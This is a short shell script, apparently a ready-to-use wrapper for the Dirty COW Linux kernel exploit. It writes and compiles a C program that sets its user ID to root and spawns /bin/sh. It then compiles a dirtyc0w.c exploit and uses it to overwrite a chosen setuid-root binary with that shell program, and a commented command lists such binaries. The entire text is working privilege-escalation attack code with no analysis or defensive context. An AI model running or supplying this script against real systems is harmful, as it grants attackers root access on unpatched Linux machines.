#!/bin/sh
#find / -user root -perm -4000 -print 2>/dev/null

if [ -z $1 ]; then
	exit 1
fi
BASE=$(dirname $(readlink -f $0))

cat << __EOF__ > /dev/shm/s.c
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}       
__EOF__
gcc /dev/shm/s.c -o /dev/shm/s
gcc -lpthread ${BASE}/dirtyc0w.c -o ${BASE}/dirtyc0w
cp $1 ~
${BASE}/dirtyc0w $1 /dev/shm/s
$1

